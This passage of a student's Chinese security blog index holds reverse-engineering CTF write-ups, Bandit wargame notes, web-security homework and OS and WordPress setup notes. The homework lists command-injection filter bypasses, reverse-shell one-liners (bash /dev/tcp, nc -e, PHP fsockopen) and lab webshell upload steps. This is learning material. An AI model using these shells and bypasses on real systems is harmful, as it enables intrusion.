q65oOz6Lef5oiR5Zyo5LiA6LW377yM5byA5b+D77yB5L2G5piv5rKh5aSE5aSf5LiA5bm05ZGi5bCx5Zug5Li65byC5Zyw5YiG5LqG77yM5omA5Lul5oiR5oqK6L+Z5Y+l6K+d5pS55oiQYmFzZTY05LqG77yM55yL5Yiw6L+Z5Y+l6K+d57uZ5oiR5pW056C06Ziy5LqG\n","date":"2020-05-19T10:56:00Z","permalink":"https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/","title":"【ACTF新生赛2020】usualCrypt"},{"content":"\n下载后是个elf文件，直接扔进IDA分析：\nMain的代码也比较简单：\n根据提示，我们需要输入六个数据，在经过两处处理之后得到一段数据，最后将其转换为十六进制在转成字符串。\n第一部分处理：\n这里是将输入的六个数据第一次处理，三次循环，每次取两个数据出来存到dword_601078和dword_60107C中。\nsub_400686对每次取出的第一个数据进行再处理，byte_601060里面存放的是四个数据：2，2，3，4。\n我们进去sub_400686函数内部：\n需要注意的地方是，a3取到了a1[0]，a4取到了a1[1]，其实就是在外面循环中每次取入的两个数据。\n在函数内部经过六十四次运算之后，将得到的结果存入a1[0]和a1[1]，返回外面的循环。\n在之后便是把这两个处理过的数据放进v11数组中。这个地方的第二个数据其实已经发生了变化，地址存放的数据已经改变了。\n第二个处理便是：\n这里需要进入sub_400770内部查看：\n这里比较简单了，用计算器算一下这六个数，这六个数就是上面一层数据处理之后应该得到的结果。\n那么需要我们逆向的就是通过这六个数反推我们应该输入的六个数，大体流程比较简单（不会贴代码只好放图）：\n我在写程序的时候发现对数据定义的不同会造成不同的结果。比如我对数组a[6]定义成unsigned int 和long int就完全不一样。\n之前学C的时候没怎么注意过数据范围，搞算法竞赛的时候也只是随手丢一个long long，为什么会出现差别呢？我觉得其中的细节值得深究一下。\n跑出来的结果：\n666c61677b72655f69735f6772656174217d\n用在线网站转化一下：\nflag{re_is_great!}\n好了今天的思修笔记还没写，已经十点多了应该来得及。\n","date":"2020-05-18T14:18:00Z","permalink":"https://dorinxl.github.io/p/gwctf-2019xxor/","title":"【GWCTF 2019】xxor"},{"content":"\n下载下来解压后发现是一个unity的···游戏？\n由于unity是用C#开发，这里我们就不去用IDA了，用dnspy看源码就够了。\n在BJD hamburger competition_Data\\Managed文件夹中找到Assembly- CSharp.dll\n这个dll文件是程序的源码，用来存放C#工程。\n把它拖进dnspy：找到有用的ButtonSpawnFruit类：\n在里面发现了有关flag的判断条件：\n总的来说就是选择五个小憨包的原料，然后构成str，这个str的sha1哈希值有了，扔进在线解密网站解出来是1001。\n下一步就是把1001进行MD5一下，最初我把md5直接提交发现不对，于是点进函数内看了看：\nMD5加密后改成大写，取0-20位输出：\nB8C37E33DEFDE51CF91E\n","date":"2020-05-17T08:22:00Z","permalink":"https://dorinxl.github.io/p/bjdctf2020bjd-hamburger-competition/","title":"【BJDCTF2020】BJD hamburger competition"},{"content":"先查壳：\n无壳，跑一下看看：\n没有输入的地方，根据这句\u0026quot;Can you find me?\u0026ldquo;我们大致推测，数据是被藏起来了，通过正常手法应该找不到。\n拖进IDA看看，main函数并没什么用。\n打开strings窗口看看，挨个点了一圈也没什么有用的数据。\n最后在这个_ques函数里面找到了：\n分析一波，给出十个数据，然后进行拼接到v14上，HIDWORD是高16位，LODWORD是低16位，有点寄存器的意思？\n查了一波资料发现这是宏定义：\n那就好办了，十个数据组成五个数据，然后把这五个数据按二进制存储，对每位进行分析，是1输出*，是0输出空格，该回车回车：\n运行一下是一副画（flag）：\nHACKIT4FUN\n","date":"2020-05-17T03:48:00Z","permalink":"https://dorinxl.github.io/p/bjdctf2020easy/","title":"【BJDCTF2020】easy"},{"content":"先查壳：\nUPX壳，脱壳后扔进IDA\n弹出的提示无伤大雅，直接F5\n逻辑很简单，开头是ACFT{，最后是}，给出的v4数组和byte_402000数组比较，取出byte数组中的下表进行减法得到flag的ascii值。\nFlag:\n","date":"2020-05-16T09:09:00Z","permalink":"https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020easyre/","title":"【ACTF新生赛2020】easyre"},{"content":"天气阴沉闷热，像是要下雨，不想写物理了就来照顾一下博客。\n在此之前，我花了一个星期的时间专注于补作业，ctf的知识一点没有进展。\n疫情关系，在家慢慢刷题，参加了各种线上赛事，包括但不限于协会内部赛、其他学校公开赛、高校战疫、xctf、安恒月赛、网鼎杯等。\n基本就是在BUU和XCTF上刷题。\n解决的第一个ctf题是在2019.11.03，题目来自xctf，是一道逆向题。从此专注于逆向。但到目前为止半年出头，进展极小。\n最好的赛事名次大概是网鼎杯563名，和学校的几个伙伴们一起。\n仔细想想，每天都有时间做新题，自己也有保存新题的习惯，为什么不把这些题的wp每天都记录一下呢？\n所以，为了充实自己的博客，记录一下刷题记录和生活，我决定在这个模块里专门存放刷下来的wp，以供自己和其他人参考。尽量每天最少一个。\n希望今年结束的时候可以变强吧，那个时候应该是大二中期，大学生活的3/8了。\n加油！\n","date":"2020-05-16T09:08:00Z","image":"https://dorinxl.github.io/p/2020.5.16-1506/1858293-20200516170806738-310589045_hu5533699294963722738.png","permalink":"https://dorinxl.github.io/p/2020.5.16-1506/","title":"2020.5.16 15：06"},{"content":"通过suctf-2016的一道题：serial-150而引发的一系列问题与解决方案：\n这道题目怎么解： 本意是想通过解决这道题来学习新知识，确实学到了。\nIDA打开后发现无法反编译，此时我想，如果是exe的话我可以用od动态调试，可是elf该用什么呢？linux上有专门的调试工具，可我都没怎么用过。\n在网上搜寻wp后发现用的是IDA通过远程连接linux来调试elf文件，那么问题来了，我不会。\nIDA远程动态调试ELF文件 因为还没有研究《IDA Pro权威指南》，暂时跟着网上的来。\n综合了多家博客的方式，我也算终于摸索出来如何实现IDA远程调试ELF文件。\n从效果上看，IDA在我主机上运行，通过设置连接到了虚拟机的linux系统上，实现了主机调试，虚拟机运作的这么一种方式。原理暂不明白。\n以下是成功之后的情况：\n连接的第一步：\n将对应的文件复制到linux中，一个32位一个64位请自己选择。（以64位为例\n然后我将需要调试的文件一并复制到一个专门的文件夹：\n然后在linux中运行，这里我用了【chmod 777 linux_server64】指令打开权限，然后【./linux_server64】开启服务：\n此时，linux上的步骤已经完成了。\n如果是第一次操作的话需要加几个步骤：\n【ifconfig】来找到自己虚拟机的ip地址：\n我的虚拟机在这一步出现了问题，这是后面我要说的。\n【pwd】记录所在位置的路径：\n然后就是主机上IDA的设置了：\n像之前一样将文件拖入IDA，然后打开。\n打开之后在菜单栏：\nselect debugger\n选择remote linux debugger\n选择process options\n这一步就比较重要了，也比较容易出错，改写什么我都在图中标注好了。\n如果没有问题的话，我们按下F9就可以开始调试了，同时linux虚拟机上会显示连接成功的消息：\n之后便可以开始调试了，具体怎么调试就是另一个问题了。\n一些问题：\n第一个问题：\n我遇到的第一个问题就是IDA反映了这么一段话：\nThe file cant be loaded by the debugger plugin.\nPlease verify that the parameters are valid.\n调试器插件无法加载文件，请验证参数是否有效。\n我解决这个问题的方法是关闭了防火墙，大概放开端口也可以解决。\nUbuntu关闭防火墙：【sudo ufw disable】\nUbuntu打开防火墙：【sudo ufw enable】\nUbuntu开启端口：【sudo ufw allow 端口号】\n第二个问题：\n这个是因为填写的ip地址不正确，至于为什么填了个这个，是因为我第一次ifconfig的时候没有ip地址…\n第三个问题：\n这个也是因为输错了ip，不过这次不是localhost了，是我另外的虚拟机的。\nVMware下我的Ubuntu虚拟机没有IP地址解决方案 在我尝试连接虚拟机的时候，第一次并没有填写正确的ip地址，因为根本没有给我。\n在网上找解决方案，看到一个人的博客里写着自己修改了开机选项，关闭了一些选项，把他们开启就好了：https://blog.csdn.net/qq_38222534/article/details/80635272\n最后，你问我这题怎么做？\n那得等我用熟动态调试才行。\n","date":"2020-04-19T10:19:00Z","permalink":"https://dorinxl.github.io/p/%E7%94%B1%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E8%80%8C%E5%BC%95%E5%8F%91ida%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/","title":"由一道逆向题而引发，IDA调试ELF文件"},{"content":"这是一道代码审计的题\npthread.h库函数涉及到UNIX内核了，一些关于线程的函数现在还读不太懂。但是不妨碍我们做题。\n主函数告诉我们输入flag到user_string函数中。然后is_ok是函数high_optimized_parallel_comparsion的返回值。我们要做的是让这个函数的返回值为1。\n进入函数high_optimized_parallel_comparsion：\n函数的一部分是在告诉我们：\n声明了两个变量：initialization_number和first_letter，这两个变量下面都要用到。\ninitialization_number是一个大于64的随机数，而first_letter是前面那个数对26取模再加97；\n一个数对26取模，取模后的数的范围是0-25，所以我们反推initialization_number的范围是97-122；\n接下来的pthread_create函数用到了checking函数，我们先往下看。\n这里声明了result，根据最后的函数我们可以得知，reault必须为0。\n而恰好checking函数会返回result的值：\n将checking函数和high_optimized_parallel_comparsion函数中的pthread_create函数相结合，我们可以分析出来：argument[0] 是first_letter，argument[1] 是数组differences中对应下标的值，而argument[2]就是我们要输入的对应位置的字符。\n经过一番逆向推导，result的值要保持为0，那么0^任何数都是这个数本身，所以我们有：\nargument[2] = argument[0] + argument[1]\n既有：我们输入的字符由first_letter和数组differences组成。\n换句话说，我们只要知道first_letter，知道initialization_number是多少，就可以了。\ninitialization_number的范围我们在上文已经推测出，是一个定值。\n经过爆破我们可以得到自己想要的答案：\n实际上涉及到的进程函数我还是很想搞明白的，但是要搞明白的话就需要了解更多的知识。慢慢来吧，从语言到操作系统到内核，一口可吃不成个胖子。\n虽然我想说C语言天下第一，但是不得不承认有些时候C还是比较折磨人的。\n","date":"2020-04-18T09:10:00Z","permalink":"https://dorinxl.github.io/p/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%AF%B9%E4%BA%8Eparallel-comparator-200%E7%9A%84%E7%90%86%E8%A7%A3%E7%9A%84%E6%84%9F%E6%83%B3/","title":"【攻防世界】对于parallel-comparator-200的理解的感想"},{"content":"关于解题过程中出现的疑惑点。\n小白学习记录，大师傅勿喷，欢迎交流。\n在该题中，join和strcat都是实现拼接字符的功能。但是在我解题的过程发现当拼接src和v9字符串时，这两个字符串应该反过来接上，也就是key3+\u0026ldquo;hadow\u0026quot;和key+\u0026ldquo;NDCLS\u0026rdquo;。\n暂且认为是取出数据时是按照栈的推出来着，就像汇编里存取字节一样。学艺不精，网上没查到相关资料，姑且这样认为，且留下疑问。\n此处存在模运算，如果想要解密的话需要模的逆运算。但是我还没有想到如何逆模运算，这里可能要涉及数论知识，先在这里指出来供日后修改。这里解题我是用暴力破解，每个遍历，符合条件了再break一下。\n","date":"2020-04-12T10:34:00Z","permalink":"https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95simplerev%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%92%8C%E9%80%86%E6%A8%A1%E8%BF%90%E7%AE%97/","title":"【个人记录】SimpleRev解题过程中遇到的问题：数据处理和逆模运算"},{"content":"记录一次比较难受的解题过程\nRe小白慢慢刷题路，遇到一道目前对我来说稍有难度但却很适合提升的一道题\n做题过程比较痛苦，没有前面切题的快感\n在网上看了些师傅的wp做完的，仅用于记录，不算wp。\n大师傅们看到了图一乐就好。\n关于函数sub_4010F0:\n粗略浏览大致可以推测是对v7-v17的数据进行变更替换。把这些数据放在数组中，Int型的数据占4位，所以可以把乘4的变量看作数组下标。\n阅读读不出结果，写一份代码自己跑结果：\n打开sub_401000函数，在里面找到了base64字符串，推断这是个加密函数，于是不再分析内部结构。\n对最后的分析：\n在函数sub_4010F0处理之后，字符串变味了，变成了3CEHJNSZagn，v7-v17的值也相应变化。\nString是我们输入的内容，将v4v5base64解密放到正确的位置即可。\nflag{UJWPWP1jMp}\n","date":"2020-04-12T04:00:00Z","permalink":"https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E8%AE%B0%E5%BD%95buu_%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","title":"【个人记录】BUU_刮开有奖解题记录"},{"content":"Bandit wargame闯关记录 Level 0 —— Level 1 主要告诉我们如何SSH连接登陆服务器。\n这里我用的是FinalShell，输入好信息，勾上海外加速，开始做题：\n在做了几关之后发现每次进入下一个level都要修改用户名后面的数字，不然密码会匹配不上。\n进入第一关的密码就在用ls可以看到的一个名为readme的文件中，用命令【cat readme】可以查看并进入下一关。\nLevel 1 —— Level 2 根据任务提示我们可以知道，下一关的密码就在home/bandit1里面。可以看到里面的文件有一个名为-的，如果我们用指令【cat -】的话，-不会被识别为名称。所以我们使用【cat ./-】来表示查看此文件夹下的-文件：\nLevel 2 —— Level 3 进入level2，ls找文件，发现一个文件名字中带有空格，如果我们直接cat文件名的话是打不开的，因为空格会使系统认为这是四个不同的文件而非同一个文件：\n如果我们想要访问这样的一个文件，可以先Google一下\u0026quot;spaces in filename\u0026quot;，然后就学会了新技能：\n使用引号： 看起来单双都可\n使用反斜杠\\来表达原有意思： Level 3 —— Level 4 任务目标：找出隐藏在inhere文件夹下的文件\nLinux中隐藏文件用的是在文件名前加. ，而我们使用【ls -a】可以显示所有文件，包括隐藏的文件。\nLevel 4 —— Level 5 任务要求中提到了\u0026quot;human—readable\u0026quot;，经过ls之后，看到很多的文件，我这里一个一个打开，其中一个文件里面存着下一关的密码：\n也可以用【file】命令来识别文件，【file ./*】将所有文件的格式显示出来。\nLevel 5 —— Level 6 密码藏在inhere文件夹中，是一个人类可读文件，有1033字节，不可执行。\nInhere文件中有好多个文件夹，一个一个效率过于低下，这里我们使用【find】命令\n【find -type f -size 1033c】\n找到文件，进入：\nLevel 6 —— Level 7 仍然使用find指令，不过这次要在全局范围寻找：\n【find / -user bandit7 -group bandit6 -size 33c 2\u0026gt;/dev/null】\n-user用户\n-group 组\n2\u0026gt;/dev/null 是将所有的错误信息扔进黑洞。2是错误信息，如果回显到显示屏上会影响我们的寻找结果。\nLevel 7 —— Level 8 接下来的密码藏在data.txt中，而这个密码在单词millionth旁边。\n如果我们直接打开data.txt，那么会看到铺天盖地的各种密码。\n跑上一会也不一定跑的完。\n所以这里明显是需要我们在文件中查找特定信息的指令。\n【grep】命令用来查找文件中符合条件的特定字符串\n| 管道符，可以将前面的正确输出做为后面的输入，需要注意的是后面只接受正确的输出。\nLevel 8—— Level 9 下一关的密码在data.txt中只出现一次的行中。\n但是不能只用uniq命令，因为uniq命令是通过比较上下两行是否相同得出结果的。\n在使用uniq之前我们需要先用sort进行一次排序。\nLevel 9—— Level 10 下一关的密码在data.txt中，但是是分散的，以\u0026quot;=\u0026ldquo;开头。\n直接打开data.txt是一堆乱码\n参考网上资料，找到了strings这个神奇的指令，它主要用来提取和显示非文本文件中的文本字符串，比如在对象文件或二进制文件中查找可打印的字符串。\n通过组合cat和strings【cat data.txt | strings】，得到：\n通过1-10能学到什么： 学会XSS连接\n最基本的cat打开文件指令，包括打开一些文件名很奇怪的文件（如以. – 开头，文件名中有空格等）\nls 和部分参数的使用\nfile 识别文件格式\nfind 寻找特定的文件\n2\u0026gt;/dev/null 扔掉错误提示，知道了\u0026quot;黑洞\u0026quot;的存在\n| 管道符的初步了解\ngrep 查找文件中符合条件的特定字符串\nsort 和 uniq 的初步使用，一个排序，一个查重\nstrings的奇妙使用\n","date":"2020-04-05T09:21:00Z","permalink":"https://dorinxl.github.io/p/bandit-wargame%E4%B8%AA%E4%BA%BA%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%E4%B8%8A1-10/","title":"Bandit  wargame个人闯关记录上（1-10）"},{"content":"Web安全工程师(入门班)\n【全国线上入门班53期】课后作业\n2020-2-28\nDorinXL\n查资料都有哪些绕过命令注入过滤技巧？ 1.黑名单绕过\n字符拼接：a=l;b=s;$a$b 输出ls\n2.空格绕过：\n​ ${IFS}空格\n​ ​ \\x20转化成字符串也是空格\n​ ​ 重定向符\u0026lt;\u0026gt;\n3.编码绕过：\n输入echo MTIzCg==|base64 -d，将会打印123\n4.用单引号和双引号绕过：\n例如：ca\u0026rsquo;\u0026rsquo;t flag 或者是 ca\u0026quot;\u0026ldquo;t flag\n5.反斜杠绕过：\n例如：ca\\t fl\\ag\n6.绕过长度限制：\nlinux下可以用 1\u0026gt;a创建文件名为a的空文件，ls -t\u0026gt;test则会将目录按时间排序后写进test文件中，sh命令可以从一个文件中读取命令来执行\n检测命令注入漏洞时没有回显怎么办？ 利用延时命令查看响应速度或者请求服务器查看是否接收到请求。\n延时注入：windows：ping 127.0.0.1 -n 5 \u0026gt;nul\nLinux : sleep 5\n远程请求：windows : ping,telnet等 Linux : wget,curl等\n怎么通过命令注入漏洞反弹shell？ 反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。\n**Bash方式** ： $ bash -c \u0026quot;sh \u0026gt;\u0026amp; /dev/tcp/your ip/port 0\u0026gt;\u0026amp;1\u0026quot; exec方式 ： $ exec 5\u0026lt;\u0026gt;/dev/tcp/ip/port\nnc方式\n本机运行:\nnc -l -vv -p port\n目标主机:\nnc -e /bin/bash ip port\nphp方式\nphp -r \u0026lsquo;$sock=fsockopen(\u0026ldquo;ip\u0026rdquo;,port);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026rdquo;);\u0026rsquo;\n","date":"2020-03-02T02:58:00Z","permalink":"https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.28%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","title":"i春秋web作业2.28——命令注入"},{"content":"Web安全工程师(入门班)\n【全国线上入门班53期】课后作业\n2020-2-27\nDorinXL\n1）思考SQL注入采用什么方法植入WebShell？\n可以在表中保存木马数据，然后导出库保存文件，删除新建的表。\n拥有写入权限时，选择select … into outfile 语句：select A into outfile B，意思是选择a的数据导入b。通过与其他联合语句将shell写入，但是要知道路径。\n2) SQL注入能否查看文件？\nSQL注入可以查看文件，但是有前提条件。\n要知道文件的路径，要拥有读写权限，然后通过构造合适的语句来达到查看文件的目的。\n使用load_file函数 读取\n3）思考SQL注入盲注的原理以及利用方法\n无法根据报错信息来进行注入判断的情况，称之为盲注。\n盲注通过逻辑真假以及是否有返回来判断漏洞存在，然后便是猜测表名、用户名等数据。\n","date":"2020-03-02T02:57:00Z","permalink":"https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.27sql%E6%B3%A8%E5%85%A5/","title":"i春秋web作业2.27——SQL注入"},{"content":"Web安全工程师(入门班)\n【全国线上入门班53期】课后作业\n2020-2-26\nDorinXL\n1）为什么说js校验是一种不安全的校验方式？\njs校验不安全，是因为用户很容易通过控制台删除或是禁用js从而达到绕过校验的目的。\n但是客户端的校验速度快，js可以提升用户体验，同时可以减轻服务器的压力。\n虽然js并不安全，但是为了保障用户体验还是有存在的必要。\n所以为了保障起见，客户端的js校验和服务端的二次校验都应存在。\n2)Apache解析漏洞如何利用呢？\n低版本的Apache认为，一个文件可以有多个后缀。如果有必要，Apache会从右往左，一一辨别后缀。\n当Apache不认识某个后缀时，如某文件名为：warma.mp3.html.qwe.abc，Apache在处理时，先读取最后一个后缀，为\u0026quot;.abc\u0026quot;，不认识，继续读取下一个后缀\u0026quot;.qwe\u0026quot;，还是不认识，继续读下一个后缀\u0026quot;.html\u0026quot;，认出之后会当作超文本标记语言文件进行执行。\n可以通过Apache的这种特性来绕过黑名单校验。\n","date":"2020-02-28T03:19:00Z","permalink":"https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.26%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"i春秋web作业2.26——文件上传"},{"content":"Web安全工程师(入门班)\n【全国线上入门班53期】课后作业\n2020-2-25\nDorinXL\n请思考：XXE漏洞的原理的是什么？有哪些危害？ XXE漏洞全称XML External Entity Injection ，即xml外部实体注入漏洞。实在应用程序加载xml文件的时候，因为没有禁止外部实体的加载，导致可能加载上恶意文件或代码。\nXXE的危害包括但不限于任意文件读取 、端口扫描 、Dos攻击 等。\n如果想要防御XXE攻击，最直接的办法就是禁止xml中包含自有的DTD，从而达到一种过滤的效果。\n2）寻找OWASP 近年漏洞的排名变化，思考未来哪些方面会成为Web应用主要安全威胁？\n根据往期top10的排名，个人认为注入威胁或将继续大范围存在。几乎所有的数据源都可以成为注入点，虽然注入漏洞可以很容易的被扫描器或其它工具发现，但想要做到近乎完美的严格过滤很困难。\n安全配置错误、不足的日志记录和监控，这些威胁我认为建设者和防御者要承担一部分责任，属于设计上的漏洞。\n使用包含已知漏洞的组件这一项虽然不会大面积增长，但却可能持续存在，打个补丁能解决的问题，往往会像牛皮糖一样死缠烂打，一环扣一环的进行下去。\n新增加的风险类型XXE或许将淡出视线。\n3）请思考：都有哪些PHP函数可以替代eval？\neval() 函数把字符串按照 PHP 代码来执行。\nsystem不能替代eval，https://www.cnblogs.com/xiaozi/p/7834367.html 4）请使用中国菜刀对网站数据库进行管理操作。\n实验条件有提示了，那我们注册好进入上传的页面，审计代码后f12删除检查函数：\n写好一句话木马：\n上传成功：\n菜刀连接：\n成功进入：\n找到flag：\n关于数据库的一些姿势：\n以本实验为例：\n找到jieqi（杰奇）system（系统）users（用户）中的admin以及密码，md5解密一下21232f297a57a5a743894a0e4a801fc3：\n实验完毕。\n","date":"2020-02-25T15:03:00Z","permalink":"https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.25webshell/","title":"i春秋web作业2.25——WebShell"},{"content":"Web安全工程师(入门班)\n【全国线上入门班53期】课后作业\n2020-2-24\nDorinXL\n分别尝试安装一个Windows和Linux操作系统 想要在虚拟机上装系统，首先需要下载对应的镜像文件(.iso)，接着选择上对应的镜像文件按照向导的提示进行安装。 在安装时也可以选择先安装一个包含空白硬盘的虚拟机，镜像文件可以之后在硬件设置中选择放入。 新建包含空白硬盘的虚拟机的时候要选好操作系统。 当向导结束后，开启虚拟机，按照操作系统提示进行设置，重启之后正常开机表示可以运行操作系统。 2）自己搭建一个网站\n我们可以通过一些搭配来完成基于虚拟机的网站的搭建（比如LAMP、LNMP等），也可以去各大服务器厂商处购买云服务器以保证更高的需求（阿里云、腾讯云等）。 以最简单的phpstudy为例： 启动phpstudy之后，在www文件夹下可以放置我们需要的网站源码。 如果想要部署其他网站也可以放置在www文件夹下，然后按照对应路径访问。 关于访问网站：我们在访问自己搭建的网站时，需要在url框中填入虚拟机的ip，查看ip可以用ipconfig指令来查看。 3）分析网站和浏览器之前通信的HTTP协议\nHTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。 HTTP协议的特点：简单快速、灵活、无状态、无连接，支持B/S和C/S 客户端向服务器发送一个http请求时，格式包含：请求行、请求头部、空行和请求数据四个部分。 以www.baidu.com抓包为例：。 服务器响应也有四个部分组成：状态行、消息报头、空行和响应正文。 4）思考虚拟机的NAT模式与桥接模式的区别\nNAT模式：NAT是网络地址转换的意思，虚拟机通过把物理主机作为路由器来访问互联网，虚拟机和主机是从属关系。虚拟机之间可以相互访问。 桥接模式：虚拟机和主机之间在同一网段，属于并列关系，主机和虚拟机处于对等地位。 5）如何保存虚拟机的多个运行状态\n拍摄快照可以保存任意时刻的虚拟机形态，在攻击靶机前最好对靶机进行拍摄快照，以便在靶机无法正常运行的时候回复到正常状态下。 恢复快照可以回到拍摄快照的时候。 6）思考HTTP代理的作用\nHTTP代理可以看作是中转站，开启代理之后可以对包内信息进行拆解、分析，以便进行下一步操作。 代理可以隐藏真实IP，免受别人的攻击，也可以保护自己。 ","date":"2020-02-25T15:01:00Z","permalink":"https://dorinxl.github.io/p/i%E6%98%A5%E7%A7%8Bweb%E4%BD%9C%E4%B8%9A2.24web%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80/","title":"i春秋web作业2.24——web渗透环境搭建与基础"},{"content":"7.1 引言 计算机系统主要由两个部分组成：硬件和软件；软件又分为操作系统和应用程序。应用程序使用硬件来解决用户的问题，而操作系统控制用户对硬件的访问。 7.1.1 操作系统 操作系统是计算机硬件和用户的一个接口，它使得其他程序更方便有效的运行，并能方便对计算机硬件和软件资源进行访问。 7.1.2 自举过程 操作系统也是程序，在加载操作系统的过程：\n很小一部分内存放在ROM中，其中有称为 自举 的小程序。当计算机被加电时，CPU计数器被设置为自举程序的第一条命令，将操作系统从磁盘装入RAM内存，之后计数器的第一条命令为操作系统的命令，操作系统被加载完毕。 7.2 演化 7.2.1 批处理系统 批处理操作系统 被设计于20世纪50年代。 每个运行的程序叫做一个 作业 。 7.2.2 分时系统 多道程序 概念被引入，分时 是指资源可以被不同的作业分享，每个作业可以分到一段时间来使用资源。 进程 是指在内存中等待资源分配的程序。 7.2.3 个人系统 个人计算机产生，需要一类适合这类计算机的操作系统。单用户操作系统 诞生，例如DOS（磁盘操作系统）。 7.2.4 并行系统 并行系统的设计：同一计算机安装多个CPU，每个CPU可以处理一个程序或其一部分。 7.2.5 分布式系统 资源可以是分布式的，一个程序需要的文件可能分布在世界的不同地方。分布式系统 结合了以往系统的特点和新的功能。 7.2.6 实时系统 实时系统 指在特定时间限制内完成任务，他们被用在实时应用程序中。 7.3 组成部分 现代操作系统至少有以下四种功能：存储功能、进程管理、文件管理、设备管理。还有一个部分负责与外界通信，称为用户界面或命令解释程序。\n现代操作系统的第一职责是内存管理，内存分配必须由操作系统分配，内存管理技术可以分为两类：单道程序和多道程序。在单道程序中，内存的大部分容量为一个程序独享。在多道程序中，多个程序同时在内存中。\n操作系统的第二职责是进程管理。进程是运行的程序。进程管理使用调度器和队列来管理进程。进程管理涉及具有不同资源的不同进程间的同步问题。这可能潜在的造成资源死锁和饿死。死锁是指一个进程由于其他进程无限制的使用资源导致无法运行的情况。饿死是指一个进程由于资源分配限制太多而不能执行的情况。\n现代操作系统的第三职责是设备或I/O管理。在计算机系统中，输入/输出设备在数目和速度上都有限制。因为这些折别与CPU和内存相比，速度很慢，所以，当一个进程访问输入/输出设备时，它对其他进程就不可用。设备管理器负责输入/输出设备的高效使用。\n现代操作系统的第四职责是文件管理。操作系统使用文件管理器控制对文件的访问。只有进程或用户被允许访问指定文件时，访问才被允许。访问的类型可以改变。\n具有一些类似性的两个常见的操作系统的UNIX和Linux。UNIX是多用户、多进程、可移植的操作系统，它由四部分构成：内核、命令解释器、一组标准工具和应用程序。Linux由三部分构成：内核、系统工具和系统库。\n微软流行的操作系统家族是Windows。Windows是面向对象的、多层的操作系统。它使用多层，包括硬件抽象层(HAL)、执行层和环境子系统层。\n","date":"2020-02-10T09:09:00Z","permalink":"https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"第七章 操作系统"},{"content":"真滴流啤，web逆向杂项隐写还挺全乎的。 位列827名，算是入门了。 ","date":"2020-02-09T10:26:00Z","permalink":"https://dorinxl.github.io/p/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%95%99%E5%BF%B5/","title":"梦之光芒小游戏通关留念"},{"content":"1. 准备LNMP环境 LNMP 是 Linux、Nginx、MySQL 和 PHP 的缩写，是 WordPress 博客系统依赖的基础运行环境。我们先来准备 LNMP 环境 安装Nginx 使用 yum 安装Nginx：\nyum install nginx -y 修改 /etc/nginx/conf.d/default.conf，去除对 IPv6 地址的监听：\nserver { listen 80 default_server; # listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / { } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } 修改完成后，启动Nginx：\nnginx 此时，可访问实验机器外网HTTP服务来确认是否已经安装成功。\n将Nginx设置为开机自动启动：\nchkconfig nginx on 安装MyAQL 使用 yum 安装MySQL：\nyum install mysql-server -y 安装完成后，启动MySQL服务：\nservice mysqld restart 设置MySQL账户root密码：\n/usr/bin/mysqladmin -u root password '此处填密码' 将MySQL设置为开机自动启动:\nchkconfig musqld on 安装PHP 使用 yum 安装PHP：\nyum install php-fpm php-mysql -y 安装之后，启动PHP-FPM进程：\nservice php-fpm start 启动之后，可以使用下面的命令查看PHP-FPM进程监听哪个端口：\nnetstat -nlpt | grep php-fpm 把PHP-FPM也设置成开机自动启动：\nchkconfig php-fpm on 2. 安装并配置WordPress 安装WordPress 配置好LNMP环境后，继续使用yum来安装WordPress\nyum install wordpress -y 安装成功后，可以在/usr/share/wordpress看到wordpress的原代码了。\n配置数据库 进入MySQL:\nmysql -uroot --password=’你的密码’ 为WordPress创建一个数据库：\nCREAT DATABASE wordpress； MySQL部分设置完了，退出MySQL环境：\nexit 把上述DB配置同步到word press的配置文件中，可以参考下面的配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 